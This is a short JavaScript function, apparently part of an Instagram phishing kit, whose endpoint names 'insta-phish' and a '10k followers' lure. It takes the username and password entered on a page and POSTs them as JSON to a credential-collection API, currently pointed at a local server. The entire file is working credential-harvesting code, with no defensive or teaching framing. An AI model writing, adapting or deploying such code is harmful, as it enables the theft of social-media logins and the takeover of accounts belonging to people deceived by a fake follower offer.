async function send_data() {
    const username = document.getElementById("username").value;
    const password = document.getElementById("password").value;

    try {
        const response = await fetch("http://127.0.0.1:8000/insta-phish/api/credentials/insta-10k-followers", {
            method: "POST",
            headers: {
                "Content-Type": "application/json"
            },
            body: JSON.stringify({
                username: username,
                password: password
            })
        });

        const result = await response.json();

        console.log(result);

    } catch (error) {
        console.error("Error sending data:", error);
    }
}